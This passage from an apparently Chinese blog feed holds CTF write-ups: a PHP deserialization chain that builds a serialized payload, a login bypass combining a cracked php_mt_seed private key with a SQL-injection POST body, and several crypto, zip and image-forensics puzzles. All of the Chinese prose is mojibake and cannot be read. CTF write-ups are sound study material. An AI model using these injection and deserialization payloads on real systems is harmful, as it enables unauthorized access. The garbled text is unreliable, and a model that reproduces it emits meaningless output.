<span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$p2</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$p2</span>-&gt;p = <span class="variable">$p1</span>;</span><br><span class="line"><span class="variable">$p3</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$p3</span>-&gt;str = <span class="variable">$p2</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$exp</span>-&gt;source = <span class="variable">$p3</span>;</span><br><span class="line"><span class="variable">$dexp</span> = serialize(<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½å¾—åˆ°åºåˆ—åŒ–çš„ç»“æœã€‚å› ä¸ºæ¶‰åŠåˆ°ä¿æŠ¤å­—æ®µï¼Œæ‰€ä»¥åœ¨æ„é€  payload çš„æ—¶å€™è®°å¾—æŠŠå­—æ®µåå‰é¢çš„ç©ºæ ¼æ¢å¤æˆ\x00ï¼Œä¸ç„¶ä¼šå¯¼è‡´ååºåˆ—åŒ–å¤±æ•ˆä»è€Œæ— æ³•æ‰§è¡Œã€‚è¿™é‡Œæ„é€ å®Œæˆä¹‹åç”¨ Python æˆ–è€… BurpSuite å‘é€æ•°æ®åŒ…ä¹‹åå¯ä»¥åœ¨å“åº”ä¸­å¾—åˆ°ä¸€ä¸² base64 æ–‡æœ¬ï¼Œè§£ç åå¯ä»¥æ‰¾åˆ° flagã€‚</p><h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">php_mt_seed</span></p><p>ä¸æ„§æ˜¯å¥½çœ‹çš„ CSSï¼Œæ‰¾äº†åŠå¤©æ²¡æœ‰æ‰¾åˆ°åˆ‡å…¥ç‚¹ï¼Œç„¶å<a href="https://duitutu.cn">å †å †</a>å‘Šè¯‰æˆ‘è¯´æœ‰æºç ã€‚ï¼ˆæˆ‘æ²¡æ‰«å‡ºæ¥ï¼‰äºæ˜¯æˆ‘å°±ç›´æ¥ä¸‹è½½äº†ä¸€ä»½ã€‚ä¸è¿‡æŸ¥çœ‹æºç çš„æ—¶å€™æ‰¾åˆ°äº† <code>.../login.html</code>ï¼Œç»“åˆæºç ä¸­çš„å…¬é’¥ç§é’¥å’Œéšæœºæ•°ç”Ÿæˆï¼ŒæŸ¥äº†ä¸€ä¸‹æœç´¢å¼•æ“ä¹‹åæ‰¾åˆ°äº† php_mt_seed è¿™ä¸ªå·¥å…·ã€‚äºæ˜¯å°†æºç æ³¨é‡Šä¸­ç»™å‡ºçš„å…¬é’¥æ•´ç†ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªå·¥å…·ç®—å‡ºç§å­ã€‚å¾—åˆ°çš„ç§å­æ˜¯ 1775196155ã€‚</p><p>è®¾ç½®å¥½ç§å­ä¹‹åï¼Œå¼€å§‹è·‘ç§é’¥ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªå…¬é’¥éœ€è¦ä½¿ç”¨ PHP 5.6.x æ‰èƒ½å¤Ÿå¯¹å¾—ä¸Šã€‚äºæ˜¯ä»¥æ­¤ç”Ÿæˆå…¬é’¥å’Œç§é’¥ï¼Œå¾—åˆ°çš„ç§é’¥æ˜¯ XuNhoueCDCGcã€‚å°†å…¶æ•´åˆåˆ° payload ä¸­ï¼Œç„¶åå†ç®€å•åœ°è¿‡ä¸€ä¸‹ password çš„ SQL æ³¨å…¥ã€‚æœ€åçš„ POST æ•°æ®æ˜¯è¿™æ ·çš„ <code>Private_key=XuNhoueCDCGc&amp;login=%E7%99%BB%E5%BD%95&amp;password=1&#39; or 1=1 #&amp;username=admin</code> ï¼Œè®¿é—®ä¹‹åå¯å¾— flagã€‚</p><h3 id="å¤©å¹²åœ°æ”¯-ç”²å­"><a href="#å¤©å¹²åœ°æ”¯-ç”²å­" class="headerlink" title="å¤©å¹²åœ°æ”¯+ç”²å­"></a>å¤©å¹²åœ°æ”¯+ç”²å­</h3><p>ç»™å‡ºçš„ä¿¡æ¯æ˜¯ <code>ç”²æˆŒ ç”²å¯… ç”²å¯… ç™¸å¯ å·±é…‰ ç”²å¯… è¾›ä¸‘</code>ï¼Œç»è¿‡å¤§å®¶çš„æé†’ä¹‹åæ‰¾äº†ä¸ªå¹²æ”¯è¡¨ï¼Œå¯¹ç€å°†æ¯ä¸€å¹´è½¬æ¢æˆäº†æ•°å­— <code>11 51 51 40 46 51 38 </code>ã€‚ç„¶åé¢˜ç›®è¦æ±‚åŠ ä¸€ä¸ªç”²å­ï¼Œä¹Ÿå°±æ˜¯å…­åå¹´ï¼ŒåŠ ä¸Šä¹‹åæ•°å­—å˜æˆè¿™æ · <code>71 111 111 100 106 111 98</code>ï¼Œå°†å…¶è¿›è¡Œåè¿›åˆ¶çš„ç¼–ç è½¬æ¢ä¹‹åï¼Œå¾—åˆ°äº† flag çš„å†…å®¹ <code>Goodjob</code>ã€‚</p><h3 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h3><p>è¿™é¢˜ç»™å‡ºçš„ä¿¡æ¯æ˜¯ <code>6 666 22 444 555 33 7 44 666 66 33</code>ã€‚è§‚å¯Ÿä¸€ä¸‹å¯ä»¥å‘ç°ï¼Œ1 å’Œ 0 éƒ½æ²¡æœ‰å‡ºç°è¿‡ï¼ŒåŠ ä¸Šæ•°å­—æœ‰é‡å¤ä¸”ä¸è¶…è¿‡ä¸‰ï¼Œæ¯”è¾ƒç¬¦åˆä¹é”®æ‹¼éŸ³çš„é”®ç›˜ã€‚äºæ˜¯å°è¯•è§£å¯†ä¸€æ³¢ï¼Œå¾—åˆ° <code>MOBILEPHONE</code>ã€‚æ­¤å³ flag çš„å†…å®¹ã€‚</p><h3 id="vigenere"><a href="#vigenere" class="headerlink" title="vigenere"></a>vigenere</h3><p>è¿™é¢˜ç»™äº†ä¸€ç¯‡å¾ˆé•¿çš„æ–‡ç« ï¼Œä½†æ˜¯å‡ºç°äº†å¾ˆå¤šä¸ä¸€æ ·çš„å•å­—æ¯ï¼Œæ‰€ä»¥åˆ¤æ–­å…¶åº”è¯¥ä¸æ˜¯å­—æ¯æ›¿æ¢ï¼ŒåŠ ä¹‹æ ‡é¢˜çš„æç¤ºï¼Œæˆ‘æˆåŠŸæ‰¾åˆ°äº†<a href="https://www.guballa.de/vigenere-solver">è¿™ä¸ª</a>ã€‚å°†æ–‡ç« æ”¾è¿›å»ä¹‹åè§£å¯†å³å¯åœ¨æ–‡ç« æœ«å°¾å¾—åˆ° flagã€‚</p><h3 id="åƒå±‚å¥—è·¯"><a href="#åƒå±‚å¥—è·¯" class="headerlink" title="åƒå±‚å¥—è·¯"></a>åƒå±‚å¥—è·¯</h3><p>è¿™é¢˜ç»™äº†ä¸ª zipï¼Œè¿˜æ˜¯åŠ å¯†çš„ï¼Œä½†æ˜¯æç¤ºè·Ÿåç§°æœ‰å…³ç³»ã€‚äºæ˜¯å…ˆä¸Šä¸€æ‰‹çˆ†ç ´ï¼Œå¾—åˆ°äº†å¯†ç ä¹‹åæ‰¾åˆ°äº†å…³ç³»ï¼Œè¢«å‹ç¼©çš„å‹ç¼©åŒ…çš„å¯†ç ç­‰äºå½“å‰å‹ç¼©åŒ…çš„åç§°ã€‚ä¸€å¼€å§‹æˆ‘å‡†å¤‡ç›´æ¥æ‰‹è§£æ¥ç€ï¼Œä½†æ˜¯å±‚æ•°å¤ªå¤šäº†ï¼Œäºæ˜¯éšæ‰‹ç äº†ä¸ª Python è„šæœ¬æ¥è§£å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile, os</span><br><span class="line"></span><br><span class="line">f = zipfile.ZipFile(os.path.join(os.getcwd(), <span class="string">&#x27;xxxx.zip&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(f.namelist())</span><br><span class="line">passwd = <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line">f.extract(f.namelist()[<span class="number">0</span>],<span class="string">r&#x27;path\to\your\folder&#x27;</span>,<span class="built_in">bytes</span>(passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"><span class="keyword">while</span> f.namelist():</span><br><span class="line">    filename = passwd</span><br><span class="line">    passwd = f.namelist()[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    f = zipfile.ZipFile(os.path.join(os.getcwd(), filename + <span class="string">&#x27;.zip&#x27;</span>))</span><br><span class="line">    f.extract(f.namelist()[<span class="number">0</span>], <span class="string">r&#x27;path\to\your\folder&#x27;</span>, <span class="built_in">bytes</span>(filename.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(passwd)</span><br></pre></td></tr></table></figure><p>è·‘åˆ°ç¨‹åºå‡ºé”™ä¹‹åå¾—åˆ°äº†æœ€åä¸€å±‚ zipï¼Œæ‰“å¼€ä¹‹åå¾—åˆ°ä¸€ä¸²æ–‡æœ¬ï¼Œä»£è¡¨ç€è‰²å—çš„ RGBï¼Œä¸”éé»‘å³ç™½ã€‚åŠ ä¸Š zip çš„åç§°çŒœæµ‹æ˜¯ä¸€ä¸ªäºŒç»´ç ã€‚äºæ˜¯å°†æ–‡æœ¬å¤åˆ¶ä¸‹æ¥ï¼Œæ”¾åˆ°å¾®è½¯å®¶ç”Ÿäº§åŠ›å·¥å…· Excel é‡Œï¼Œä½¿ç”¨ <code>=OFFSET($A$1,(COLUMN(GQ902)-1)*200+MOD(ROW(GQ902)-1,200),)</code> å°†å…¶è½¬æ¢æˆ 200x200 çš„ç»“æ„ï¼Œç„¶åå°†æ˜¾ç¤ºæ¯”ä¾‹ä¸æ–­ç¼©å°ï¼Œå°±èƒ½å¾—åˆ°é¢œè‰²å·®åˆ«ç»†å¾®çš„äºŒç»´ç ã€‚</p><div align=center><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/e13d9306-ca18-4422-8b45-dfaac6e883c6/1613214096992627/0b038af998c8bbf635ac62231e141cc89d0f4624.png" alt="Excel ä¸­å†…å®¹çš„æˆªå›¾"></p></div><p>å°†å…¶æˆªå›¾ä¹‹åæ”¾è¿› Photoshop ä¸­ã€‚è‰²é˜¶ä¸€é¡¿æ“ä½œä¹‹åå¯ä»¥å¾—åˆ°é¢œè‰²å·®åˆ«æ˜æ˜¾çš„å›¾ç‰‡ï¼Œç„¶åé€‚å½“è°ƒæ•´é•¿å®½æ¯”ä¾‹å¾—åˆ°äºŒç»´ç ã€‚</p><div align=center><img src="https://butter.lumosary.workers.dev/images/e13d9306-ca18-4422-8b45-dfaac6e883c6/1613214096992628.aHR0cDovL2kwLmhkc2xiLmNvbS9iZnMvYXJjaGl2ZS9mOWZkOGQxNWEyOTQzZWVmMzY2ZmI2MGY5YTFhODhhYmYxOTFhMzM2LnBuZw==" width="120" alt="Photoshop å¤„ç†åçš„äºŒç»´ç "/></div><p>æ‰«æä¸Šè¿°äºŒç»´ç åå¯å¾— flagã€‚</p><h2 id="Exploration"><a href="#Exploration" class="headerlink" title="Exploration"></a>Exploration</h2><h3 id="POST-å‚æ•°çš„å›è½¦ç¬¦"><a href="#POST-å‚æ•°çš„å›è½¦ç¬¦" class="headerlink" title="POST å‚æ•°çš„å›è½¦ç¬¦"></a>POST å‚æ•°çš„å›è½¦ç¬¦</h3><p>å…¶å®ä¸€å¼€å§‹æ˜¯å› ä¸º <a href="#ez-bypass">ez_bypass</a> è¿™é¢˜åœ¨å¤ç°å†™ WP çš„æ—¶å€™æœ‰å¥‡æ€ªçš„ç»“æœï¼Œæœ¬è¯¥ç”¨ %0a å­—ç¬¦ç»•è¿‡çš„åœ°æ–¹ç›´æ¥å°±è¿‡äº†ã€‚äºæ˜¯å°±æŠ“åŒ…çœ‹äº†ä¸€æ³¢ã€‚ä¸€å¼€å§‹å‘ç°äº† POST æ•°æ®æœ€åçš„ <code>0D 0A</code>ï¼Œå°è¯•æŠŠå®ƒå»æ‰ä¹‹åæœç„¶å°±æ²¡åŠæ³•é€šè¿‡äº†ï¼Œä½†æ˜¯è¿™ä¸ªæ¢è¡Œç¬¦æ˜¯ GET å‚æ•°åé¢ä¹Ÿæœ‰çš„ï¼Œäºæ˜¯å°±å»è¯·æ•™äº†ä¸€æ³¢ <a href="http://github.mrkaixin.computer">Mrkaixin</a> å­¦é•¿ã€‚åœ¨ä»–çš„æç¤ºä¸‹æˆ‘æ›¿æ¢äº†ä¸€æ³¢å¯æ˜¾ç¤ºå­—ç¬¦å‘ç° POST å‚æ•°çš„æœ€åä¸€ä¸ªçš„æœ«å°¾ä¼šåŠ ä¸ŠåŸæœ¬å±äºè¯·æ±‚çš„æ¢è¡Œç¬¦ã€‚è¿™æ ·å°±è§£é‡Šäº†ä¸ºä»€ä¹ˆä¼šå‡ºç°å¥‡æ€ªçš„ç»“æœï¼Œè€Œå½“æ‰€ä¼ çš„å‚æ•°ä¸æ˜¯æœ€åä¸€ä¸ªçš„æ—¶å€™ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯è·ŸåŸæœ¬ä¸€è‡´çš„ã€‚</p><h3 id="Nginx-é’ˆå¯¹æ–‡ä»¶åç¼€è®¾ç½®-Content-Type"><a href="#Nginx-é’ˆå¯¹æ–‡ä»¶åç¼€è®¾ç½®-Content-Type" class="headerlink" title="Nginx é’ˆå¯¹æ–‡ä»¶åç¼€è®¾ç½® Content-Type"></a>Nginx é’ˆå¯¹æ–‡ä»¶åç¼€è®¾ç½® Content-Type</h3><p>è¿™æ¬¡çš„ Apache è®¾ç½® htaccess çš„é¢˜ï¼Œå…¶å®åœ¨ nginx ä¸‹ä¹Ÿå¯ä»¥å®ç°ç›¸å…³çš„åŠŸèƒ½ï¼Œä½†æ˜¯æ²¡æœ‰åŠæ³•è¢«åˆ©ç”¨ï¼Œå› ä¸ºè¦ä» nginx.conf ä¿®æ”¹ã€‚ä½¿ç”¨ä»¥ä¸‹ä»£ç å¯ä»¥è¾¾æˆç›®çš„ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">types</span> &#123;</span><br><span class="line">  application/x-my-type ext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æŸèŒæ–°çš„ BJD CTF Online ä¹‹æ—…</title>
      <link href="/zh-CN/posts/95dd4451.html"/>
      <url>/zh-CN/posts/95dd4451.html</url>
      
        <content type="html"><![CDATA[<p>ä¸ºæ—¶ä¸€å¤©å¤šçš„æ–°æ‰‹èµ›ä¸€ä¸‹å­å°±ç»“æŸäº†ã€‚æ„Ÿè§‰æœ‰å¾ˆå¤šä¸œè¥¿å€¼å¾—å†™ä¸€å†™ã€‚è¿™æ¬¡æ¯”èµ›å¯¹äºæˆ‘æ¥è¯´æ˜¯ä¸€ä¸ªå­¦ä¹ çš„è¿‡ç¨‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæŠŠå„ç§æƒ³æ³•å®è·µçš„è¿‡ç¨‹ã€‚å…¶ä¸­æœ‰æ¬¢ä¹ï¼Œä¹Ÿæœ‰é—æ†¾ã€‚</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>è¿™æ¬¡æ¯”èµ›è¿˜æ˜¯èœå¾—çœŸå®ï¼Œè™½ç„¶æŒ‰ç…§è®¡åˆ’äº¤å‰è§£é¢˜ï¼Œä½†æ˜¯åœé¡¿çš„å´æ€»æ˜¯åŒä¸€è¾¹ã€‚å¯¼è‡´æœ€å Crypto å’Œ Misc åšäº†ä¸å°‘ï¼Œä½†æœ¬åº”è¯¥å†™ä¸Šä¸€äº›çš„ Web å´æ²¡èƒ½å†™å‡ºæ¥ã€‚è¿™ä¹Ÿæ˜¯æˆ‘è§‰å¾—è¿™æ¬¡æ¯”èµ›å¾ˆé—æ†¾çš„åŸå› ä¹‹ä¸€ã€‚Crypto å’Œ Misc è¿™æ¬¡å€’æ˜¯å†™äº†ä¸å°‘ï¼Œä½†æ˜¯ä¾æ—§æ²¡æœ‰èƒ½å¤Ÿæ‰“ç©¿ï¼ˆå°±å·®é‚£ä¹ˆä¸€ç‚¹ç‚¹ï¼Œå¦‚æœ tar.gz æˆ‘èƒ½æ‰¾åˆ°æ€è·¯çš„è¯ä¹Ÿè®¸å°±çœŸçš„å¯ä»¥æ‰“é€šè¿™æ¬¡çš„ Misc äº†ã€‚ï¼‰ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæˆ‘è§‰å¾—è¿™æ¬¡çš„æ¯”èµ›å¯¹æˆ‘æ¥è¯´æ›´åƒæ˜¯ä¸€ä¸ªå¿«é€Ÿå­¦ä¹ çš„è¿‡ç¨‹ï¼Œé™åˆ¶æ—¶é—´çš„è§£é¢˜ä½¿å¾—æˆ‘å¿«é€Ÿæ‘„å–äº†å¾ˆå¤šä¸œè¥¿ï¼Œå°±è¿™ç‚¹ä¸Šæ¥è¯´ï¼Œåæ¬¡åè€Œæ˜¯æ¬¡è¦äº†ã€‚</p><h2 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h2><p>å…¶å®æ¯”èµ›ç»“æŸä¹‹åå¿ƒé‡Œè¿˜æ˜¯æŒºéš¾è¿‡çš„ï¼Œæ¯•ç«Ÿæ„Ÿè§‰ç•™ä¸‹é—æ†¾äº†ã€‚è€Œä¸”æ¯”èµ›çš„æ—¶å€™æ€»æ˜¯ä¼šè¶Šæ¥è¶Šæ€¥èºï¼Œä¸åœåœ°çœ‹ Matrixï¼Œç„¶åä¸åœåœ°å»å°è¯•ï¼Œç¿»èµ„æ–™ï¼Œæ¢æ–¹æ³•ã€‚ç‰¹åˆ«æ˜¯ç¬¬ä¸€å¤©æ¯”èµ›åˆšå¼€å§‹çš„æ—¶å€™ï¼Œæ„Ÿè§‰ç‰¹åˆ«éš¾å†·é™åœ°çœ‹é¢˜ï¼Œç­¾å®Œåˆ°å°±ç‚¹å¼€äº†è–›å®šè°”ã€‚ç»“æœæ²¡å†·é™çœ‹çš„æˆ‘å®Œå…¨æ²¡æ€è·¯ï¼Œä¸€é€šä¹±æ€¼ï¼Œè‡ªç„¶æ²¡ç»“æœã€‚è™½ç„¶æ—¶é•¿å’Œå¤§å®¶æ‰“è¶£è¯´è¦å–„ç”¨æœç´¢å¼•æ“ï¼Œ<span class="HighlightWKT7BlueGreen">å¯æ˜¯åˆ°äº†å…³é”®æ—¶å€™ï¼Œè‡ªå·±å´æŸ¥ä¸åˆ°æŸäº›ä¸œè¥¿ï¼Œç”šè‡³è¿å…³é”®è¯çš„æå–éƒ½èƒ½å‡ºé”™</span>ã€‚å†è€…ï¼Œæ„Ÿè§‰é¢˜è¿˜æ˜¯åšå°‘äº†ï¼Œå¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨åšç€ä¸€äº›ç±»å‹å·®ä¸å¤šçš„é¢˜ï¼Œä½†å®é™…ä¸Šè¿˜æœ‰å¾ˆå¤šå¾ˆå¤šæ²¡æœ‰è§è¿‡çš„ä¸œè¥¿ï¼Œè¿™ä¹Ÿå¯¼è‡´åœ¨æ‹¿åˆ°ä¸€äº›é¢˜ç›®çš„æ—¶å€™ï¼Œå‡ ä¹æŠŠæ ‡ç­¾é¡µå¼€ç‚¸äº†ï¼Œæ¯ä¸€ä¸ªç‚¹éƒ½åœ¨ç”¨æœç´¢å¼•æ“ä»”ç»†æ£€ç´¢ã€‚æœç„¶è¿˜æ˜¯<span class="HighlightWKT7BlueGreen">å„ç§é¢˜ç›®è§å¾—å¤ªå°‘äº†</span>ï¼ŒåŠ ä¸Šä¸€éƒ¨åˆ†çš„åæ‰§ï¼Œä»¥åŠç¼ºå°‘å°è¯•ï¼Œå¸¸å¸¸æ˜¯è‡ªå·±æƒ³ç€æƒ³ç€å°±æŠŠæ€è·¯ææ‰æ¢å¦å¤–ä¸€ä¸ªäº†ã€‚è€Œä¸”åšé¢˜çš„æ—¶å€™å®¹æ˜“æƒ³å½“ç„¶ï¼Œå°±æœ‰ç§â€œæ¬¸è¿™ä¸ªç‚¹æˆ‘å¥½åƒçœ‹è¿‡ï¼Œåº”è¯¥æ˜¯è¿™æ ·å†™çš„â€çš„æ„Ÿè§‰ï¼Œç„¶åå°±ä¼šâ€œæ²¡é“ç†å•Šï¼Œæ€ä¹ˆä¼šå‘¢ï¼Ÿæ€ä¹ˆä¼šä¸å¯¹å‘¢ï¼Ÿâ€çš„æ„Ÿè§‰ã€‚æ‰€ä»¥ï¼Œè¿˜æ˜¯<span class="HighlightWKT7BlueGreen">è¦ä»”ä»”ç»†ç»†å¤šå°è¯•ï¼Œä¸è¦è¿‡äºæƒ³å½“ç„¶ï¼Œæœ‰çš„æ—¶å€™å¹¶ä¸æ˜¯æƒ³å•¥æ˜¯å•¥</span>ã€‚ï¼ˆä½•å†µæˆ‘ä¹Ÿæ²¡é‚£æ°´å¹³QAQï¼‰è¿˜æ˜¯å¾—<span class="HighlightWKT7BlueGreen">æ…¢æ…¢åœ°å¥½å¥½å­¦ï¼Œå¤šçœ‹å¤šå†™ï¼Œè¿™æ ·æ‰èƒ½æœ‰æ‰€æ”¹å–„</span>ã€‚</p><p>Ps. äº‹å®è¯æ˜ï¼ŒçœŸçš„ä¸è¦çº ç»“ä¸€é¢˜ï¼Œæˆ‘å¡åœ¨è–›å®šè°”å¡äº†å¥½ä¹…ï¼Œç„¶åä»Šå¤©å‘ç°äº†åé¢çš„ä¸€é“ç®€å•é¢˜ã€‚ï¼ˆå…¶å®è–›å®šè°”ä¹Ÿç®€å•ï¼Œæˆ‘å½“æ—¶æ—¶é—´æˆ³éƒ½è§£å‡ºæ¥äº†ï¼Œä½†æ˜¯èµ°é”™äº†æ€è·¯ï¼Œæ²¡å»æ³¨æ„é‚£ä¸ª checkï¼‰QAQ</p><p>å›è¿‡æ¥æƒ³æƒ³ï¼Œå…¶å®è§£é¢˜å°±åƒæ˜¯ç”Ÿæ´»ï¼Œæ‰€æœ‰äº‹æƒ…éƒ½ä¸å¯èƒ½å¾ˆæ€¥èºåœ°åŠæˆï¼Œè¶Šåˆ°å…³é”®æ—¶åˆ»è¶Šè¦å†·é™ã€‚å°±åƒæŸé“ç¡é†’äº†ä¹‹åçªç„¶è§£å‡ºæ¥çš„ Crypto ä»¥åŠå¬äº†å¾ˆä¹…çš„å¼€åœºæ›²ã€‚å¥½å¥½å¬ï¼ŒæŠŠæ¯ä¸€ä¸ªéŸ³å¯¹å‡†äº†ï¼Œæ‰èƒ½æ‹¿åˆ° flagï¼›å¥½å¥½å­¦ï¼ŒæŠŠæ¯ä¸€ä¸ªç‚¹æ‘¸é€äº†ï¼Œæ‰èƒ½çœŸæ­£åœ°èƒœåˆ©ã€‚</p><h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="æŒ‘é£Ÿçš„å°è›‡"><a href="#æŒ‘é£Ÿçš„å°è›‡" class="headerlink" title="æŒ‘é£Ÿçš„å°è›‡"></a>æŒ‘é£Ÿçš„å°è›‡</h3><p>æ‹¿åˆ°é¢˜ç›®é¦–å…ˆå®¡è®¡äº†ä¸€æ³¢æºç ï¼Œå› ä¸º vi æ²¡æœ‰é«˜äº®å¾ˆéš¾å—ï¼Œå°± scp ä¼ äº†ä¸€ä»½åˆ°æˆ‘æœåŠ¡å™¨ä¸Šç„¶åä¸‹è½½ä¸‹æ¥å®¡è®¡ï¼Œå‘ç°äº†å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¥–åŠ±shell</span></span><br><span class="line">        <span class="keyword">if</span>( score &gt;= <span class="number">30</span> &amp;&amp; cnt &gt; <span class="number">2333</span>)&#123;</span><br><span class="line">            GameState=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033c&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;stty icanon&quot;</span>);          <span class="comment">// æ¢å¤ç¼“å†²</span></span><br><span class="line">            system(<span class="string">&quot;stty echo&quot;</span>);            <span class="comment">// æ¢å¤å›æ˜¾</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[?25h&quot;</span>);            <span class="comment">// æ¢å¤é¼ æ ‡æ˜¾ç¤º</span></span><br><span class="line">            GiveAwards();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äºæ˜¯å¼€å§‹æ­£ç»ç©èµ·äº†è´ªåƒè›‡ï¼ˆæœ¬æ¥æƒ³æ”¹æºç é‡æ–°ç¼–è¯‘çš„ï¼Œä½†è¿œç¨‹æ²¡ç»™ gcc åšä¸åˆ°ï¼‰ï¼Œå¥½åœ¨è¦æ±‚å¹¶ä¸éš¾ï¼Œåˆ°è¾¾ 3000 åˆ†ä¹Ÿå°±æ˜¯è®©è›‡åƒåˆ° 30 ä¸ªå—å—ä¹‹ååŸåœ°è½¬åœˆåˆ·æ­¥æ•°åˆ° 2333 ç„¶åæ¸¸æˆç»“æŸã€‚ç„¶å <code>cat flag</code> å°±èƒ½æ‹¿åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å†™å‡ºæ¥ä¹‹åäº¤äº†å°±å¿˜äº†è®°flag</span><br></pre></td></tr></table></figure><h3 id="å°å§å§"><a href="#å°å§å§" class="headerlink" title="å°å§å§"></a>å°å§å§</h3><p>è§£å‹ <code>xiaojiejie.zip</code> æ‹¿åˆ°å›¾ç‰‡ä¹‹åç”¨ binwalk è·‘äº†ä¸€éï¼Œå‘ç°å°±æ˜¯ä¸€å¼ æ™®é€šå›¾ç‰‡ï¼Œä½†æ˜¯æ˜¾ç¤ºå¥½åƒä¸å¤ªæ­£å¸¸ï¼Œæœ‰ä¸€éƒ¨åˆ†æ–­å±‚äº†ã€‚äºæ˜¯æ”¾è¿› 010editor é‡Œé¢éšæ‰‹æœäº†ä¸€æ³¢ <code>BJD</code> å°±æ‰¾åˆ°äº† flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;haokanma_xjj&#125;</span><br></pre></td></tr></table></figure><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A Beautiful Picture"></a>A Beautiful Picture</h3><p>æ‹¿åˆ°å›¾ä¹‹åå‘ç°æ˜¯ä¸ºæ•°ä¸å¤šçš„ pngï¼Œé©¬ä¸Šå°±æƒ³åˆ°äº†ä¹‹å‰å†™è¿‡çš„ä¿®æ”¹å›¾ç‰‡é«˜åº¦çš„é¢˜å‹ï¼Œä½†è¿˜æ˜¯ç”¨äº†ä¸€æ‰‹ stegsolveï¼Œå½“ç„¶å¹¶æ²¡æœ‰ä»€ä¹ˆæ”¶è·ã€‚æ³¨æ„åˆ°å›¾ç‰‡çš„å®½åº¦å’Œé«˜åº¦å‘ˆç°ä¸€ç§å¾ˆå¥‡æ€ªçš„å…³ç³»ï¼ˆ1000x900 æ„Ÿè§‰çœŸçš„å¾ˆåˆ»æ„ï¼‰äºæ˜¯å°è¯•æŠŠå›¾ç‰‡æ”¾åˆ° 010editor é‡Œï¼ŒæŠŠä»£è¡¨é«˜åº¦çš„ <code>03 84</code> æ”¹æˆ <code>03 E8</code> ä¹Ÿå°±æ˜¯ 1000ã€‚ä¿å­˜åé‡æ–°æ‰“å¼€å›¾ç‰‡å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;PnG_He1ghT_1s_WR0ng&#125;</span><br></pre></td></tr></table></figure><h3 id="æœ€ç®€å•çš„MISC"><a href="#æœ€ç®€å•çš„MISC" class="headerlink" title="æœ€ç®€å•çš„MISC"></a>æœ€ç®€å•çš„MISC</h3><p>æ‹¿åˆ°å‹ç¼©åŒ…ä¹‹åå‘ç°æ˜¯åŠ å¯†çš„ï¼Œäºæ˜¯æ”¾åˆ° 010editor é‡ŒæŒ‰ç…§ä¼ªåŠ å¯†çš„å¥—è·¯å¼€å§‹å°è¯•ï¼Œæœç´¢å¸¸è§çš„å…¨å±€æ–¹å¼ä½æ ‡è®°çš„åŠ å¯†æ ‡è®° <code>14 00 09 00 </code>ï¼Œä¸€å…±æ‰¾åˆ°ä¸¤å¤„ï¼Œå°†å®ƒä»¬æ”¹ä¸º <code>14 00 00 00</code> ä¹‹åå°±è¿‡äº†ä¼ªåŠ å¯†ï¼Œæ­£å¸¸è§£å‹å¾—åˆ° secretã€‚</p><p>å°† secret æ”¾å…¥ 010editor 